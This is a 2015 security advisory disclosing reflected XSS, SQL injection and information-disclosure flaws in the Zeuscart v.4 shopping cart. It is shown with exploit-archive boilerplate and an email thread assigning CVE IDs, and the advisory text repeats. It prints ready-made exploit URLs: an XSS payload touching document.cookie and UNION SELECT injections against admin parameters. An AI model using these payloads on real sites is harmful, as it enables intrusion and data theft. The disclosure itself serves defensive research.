Advisory: Multiple reflecting XSS-, SQLi and
InformationDisclosure-vulnerabilities in Zeuscart v.4
Advisory ID: SROEADV-2015-12
Author: Steffen Rösemann
Affected Software: Zeuscart v.4
Vendor URL: http://zeuscart.com/
Vendor Status: pending
CVE-ID: will asked to be assigned after release on FullDisclosure via
OSS-list
Software used for research: Mac OS X 10.10, Firefox 35.0.1

==========================
Vulnerability Description:
==========================

ECommerce-Shopping Cart Zeuscart v. 4 suffers from multiple XSS-, SQLi- and
InformationDisclosure-vulnerabilities.

==================
Technical Details:
==================

====
XSS
===

Reflecting XSS-vulnerabilities can be found in a common
Zeuscart-installation in the following locations and could be exploited for
example by crafting a link and make a registered user click on that link.

The parameter "search", which is used in the index.php is vulnerable to
XSS-attacks.

Exploit-Example:

http://
{TARGET}/index.php?do=search&search=%22%3E%3Cbody%20onload=eval%28alert%28document.cookie%29%29%20%3E%3C!--

By appending arbitrary HTML- and/or JavaScript-code to the parameter
"schltr" which is as well used in index.php, an attacker could exploit this
XSS-vulnerable parameter:

Exploit-Example:

http://
{TARGET}/index.php?do=brands&schltr=All%3Cbody%20onload=eval%28alert%28String.fromCharCode%2888,83,83%29%29%29%20%3E

The third XSS-vulnerability can be found in the "brand"-parameter, which is
again used in index.php.

Exploit-Example:

http://
{TARGET}/index.php?do=viewbrands&brand=Bata%3Cbody%20onload=eval%28alert%28String.fromCharCode%2888,83,83%29%29%29%20%3E

====
SQLi
====

The SQL injection-vulnerabilities can be found in the administrative
backend of Zeuscart v. 4 and reside in the following locations in a common
installation.

By appending arbitrary SQL statements to the "id"-parameter, an attacker
could exploit this SQL injection vulnerability:

Exploit-Example:

http://
{TARGET}/admin/?do=disporders&action=detail&id=1+and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,database%28%29,34,35,version%28%29,37,38+--+

Another SQL injection vulnerability can be found here and can be exploited
by appending SQL statements to the vulnerable "cid"-parameter:

Exploit-Example:

http://
{TARGET}/admin/?do=editcurrency&cid=1+and+1=2+union+select+1,database%28%29,3,version%28%29,5+--+

The last SQL injection vulnerability I found can be found in the following
location and can be exploited by appending SQL statements to the vulnerable
"id" parameter:

http://
{TARGET}/admin/?do=subadminmgt&action=edit&id=1+and+1=2+union+select+1,version%28%29,3,database%28%29,5+--+

==============
Information Disclosure
==============

The administrative backend of Zeuscart v. 4 allows the admin to use a
functionality, which displays the PHP-installation settings via phpinfo():

http://{TARGET}/admin/?do=getphpinfo

Unfortunately, the PHP-script does not check, if an authorized admin
executes this functionality: It is possible even for unregistered users to
request the above link to see the informations, phpinfo() displays. That
could expose sensitive informations to an attacker which could lead to
further exploitation.

=========
Solution:
=========

Vendor has been notified. After releasing a patch, which seems not to
correct the issues, the vendor decided not to respond anymore to figure out
a solution together. Currently, there is no patch available to secure
Zeuscart-installations.

====================
Disclosure Timeline:
====================
21-Jan-2015 – found the vulnerabilities
21-Jan-2015 - informed the developers (see [3])
21-Jan-2015 – release date of this security advisory [without technical
details]
21-Jan-2015 – fork of the repository to keep the vulnerable version
available for other researchers (see [5])
22-Jan-2015 - vendor responded, provided detailed information
04-Feb-2015 - vendor patches Bin/Core/Assembler.php; vulnerabilities are
still exploitable, which has been reported to the vendor (see [3])
19-Feb-2015 - asked the vendor again, if he will patch these issues (see
[3]); vendor did not respond
21-Feb-2015 - release date of this security advisory
21-Feb-2015 - send to FullDisclosure

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

```
Hello Steve, Josh, vendors, list.

I found multiple reflecting XSS-, SQLi- and
InformationDisclosure-vulnerabilities in ECommerce Shopping-Cart Zeuscart
v.4.

====
XSS
====

Reflecting XSS-vulnerabilities can be found in a common
Zeuscart-installation in the following locations and could be exploited for
example by crafting a link and make a registered user click on that link.

The parameter "search", which is used in the index.php is vulnerable to
XSS-attacks.

Exploit-Example:

http://
{TARGET}/index.php?do=search&search=%22%3E%3Cbody%20onload=eval%28alert%28document.cookie%29%29%20%3E%3C!--

By appending arbitrary HTML- and/or JavaScript-code to the parameter
"schltr" which is as well used in index.php, an attacker could exploit this
XSS-vulnerable parameter:

Exploit-Example:

http://
{TARGET}/index.php?do=brands&schltr=All%3Cbody%20onload=eval%28alert%28String.fromCharCode%2888,83,83%29%29%29%20%3E

The third XSS-vulnerability can be found in the "brand"-parameter, which is
again used in index.php.

Exploit-Example:

http://
{TARGET}/index.php?do=viewbrands&brand=Bata%3Cbody%20onload=eval%28alert%28String.fromCharCode%2888,83,83%29%29%29%20%3E

====
SQLi
====

The SQL injection-vulnerabilities can be found in the administrative
backend of Zeuscart v. 4 and reside in the following locations in a common
installation.

By appending arbitrary SQL statements to the "id"-parameter, an attacker
could exploit this SQL injection vulnerability:

Exploit-Example:

http://
{TARGET}/admin/?do=disporders&action=detail&id=1+and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,database%28%29,34,35,version%28%29,37,38+--+

Another SQL injection vulnerability can be found here and can be exploited
by appending SQL statements to the vulnerable "cid"-parameter:

Exploit-Example:

http://
{TARGET}/admin/?do=editcurrency&cid=1+and+1=2+union+select+1,database%28%29,3,version%28%29,5+--+

The last SQL injection vulnerability I found can be found in the following
location and can be exploited by appending SQL statements to the vulnerable
"id" parameter:

http://
{TARGET}/admin/?do=subadminmgt&action=edit&id=1+and+1=2+union+select+1,version%28%29,3,database%28%29,5+--+

==============

request the above link to see the informations, phpinfo() displays. That
could expose sensitive informations to an attacker which could lead to
further exploitation.

Can I have a CVE-ID / CVE-IDs for these issues?

Thank you very much.

Greetings from Germany.

Advisory: Multiple reflecting XSS-, SQLi and
InformationDisclosure-vulnerabilities in Zeuscart v.4
Advisory ID: SROEADV-2015-12
Author: Steffen Rösemann
Affected Software: Zeuscart v.4
Vendor URL: <http://zeuscart.com/>
Vendor Status: pending
CVE-ID: will asked to be assigned after release on FullDisclosure via
OSS-list
Software used for research: Mac OS X 10.10, Firefox 35.0.1

==========================
Vulnerability Description:
==========================

ECommerce-Shopping Cart Zeuscart v. 4 suffers from multiple XSS-, SQLi- and
InformationDisclosure-vulnerabilities.

==================
Technical Details:
==================

====
XSS
===

Reflecting XSS-vulnerabilities can be found in a common
Zeuscart-installation in the following locations and could be exploited for
example by crafting a link and make a registered user click on that link.

The parameter "search", which is used in the index.php is vulnerable to
XSS-attacks.

Exploit-Example:

http://
{TARGET}/index.php?do=search&search=%22%3E%3Cbody%20onload=eval%28alert%28document.cookie%29%29%20%3E%3C!--

By appending arbitrary HTML- and/or JavaScript-code to the parameter
"schltr" which is as well used in index.php, an attacker could exploit this
XSS-vulnerable parameter:

Exploit-Example:

http://
{TARGET}/index.php?do=brands&schltr=All%3Cbody%20onload=eval%28alert%28String.fromCharCode%2888,83,83%29%29%29%20%3E

The third XSS-vulnerability can be found in the "brand"-parameter, which is
again used in index.php.

Exploit-Example:

http://
{TARGET}/index.php?do=viewbrands&brand=Bata%3Cbody%20onload=eval%28alert%28String.fromCharCode%2888,83,83%29%29%29%20%3E

====
SQLi
====

The SQL injection-vulnerabilities can be found in the administrative
backend of Zeuscart v. 4 and reside in the following locations in a common
installation.

By appending arbitrary SQL statements to the "id"-parameter, an attacker
could exploit this SQL injection vulnerability:

Exploit-Example:

http://
{TARGET}/admin/?do=disporders&action=detail&id=1+and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,database%28%29,34,35,version%28%29,37,38+--+

Another SQL injection vulnerability can be found here and can be exploited
by appending SQL statements to the vulnerable "cid"-parameter:

Exploit-Example:

http://
{TARGET}/admin/?do=editcurrency&cid=1+and+1=2+union+select+1,database%28%29,3,version%28%29,5+--+

The last SQL injection vulnerability I found can be found in the following
location and can be exploited by appending SQL statements to the vulnerable
"id" parameter:

http://
{TARGET}/admin/?do=subadminmgt&action=edit&id=1+and+1=2+union+select+1,version%28%29,3,database%28%29,5+--+

==============
Information Disclosure
==============

The administrative backend of Zeuscart v. 4 allows the admin to use a
functionality, which displays the PHP-installation settings via phpinfo():

<http://{TARGET}/admin/?do=getphpinfo>

Unfortunately, the PHP-script does not check, if an authorized admin
executes this functionality: It is possible even for unregistered users to
request the above link to see the informations, phpinfo() displays. That
could expose sensitive informations to an attacker which could lead to
further exploitation.

=========
Solution:
=========

Vendor has been notified. After releasing a patch, which seems not to
correct the issues, the vendor decided not to respond anymore to figure out
a solution together. Currently, there is no patch available to secure
Zeuscart-installations.

====================
Disclosure Timeline:
====================
21-Jan-2015 – found the vulnerabilities
21-Jan-2015 - informed the developers (see [3])
21-Jan-2015 – release date of this security advisory [without technical
details]
21-Jan-2015 – fork of the repository to keep the vulnerable version
available for other researchers (see [5])
22-Jan-2015 - vendor responded, provided detailed information
04-Feb-2015 - vendor patches Bin/Core/Assembler.php; vulnerabilities are
still exploitable, which has been reported to the vendor (see [3])
19-Feb-2015 - asked the vendor again, if he will patch these issues (see
[3]); vendor did not respond
21-Feb-2015 - release date of this security advisory
21-Feb-2015 - send to FullDisclosure

Use CVE-2015-2182.

```

>
> ```

```

We did not completely understand this part of the vendor interaction:

<https://github.com/ZeusCart/zeuscart/issues/28#issuecomment-72829334>
<https://github.com/ZeusCart/zeuscart/commit/fa919a5e4887a7d348166eac4f10b041684208ca>

<https://github.com/ZeusCart/zeuscart/issues/28#issuecomment-73352761>

The vendor seems to be suggesting the CVE-2014-3868 patch, which had
been previously discussed in the
<http://seclists.org/fulldisclosure/2014/Jun/116> post. This patch seems
related to:

  prodid
  qty
  variations
  subId

whereas your report is about:

  id
  cid

(An entirely separate issue is that the patch has a "$_POST['qty'] =
abs((int)$_GET['prodid']);" line that might result in unintended
quantity values.)

So, we think that there is not, in any sense, a "version" of ZeusCart
that fixes any attack vector that you reported. If there were an
incomplete fix, additional CVE IDs may be required.

Use CVE-2015-2183 for all of the SQL injection issues in your report.

```
> ```
> <http://{TARGET}/admin/?do=getphpinfo>
>
> ```

```

Use CVE-2015-2184.
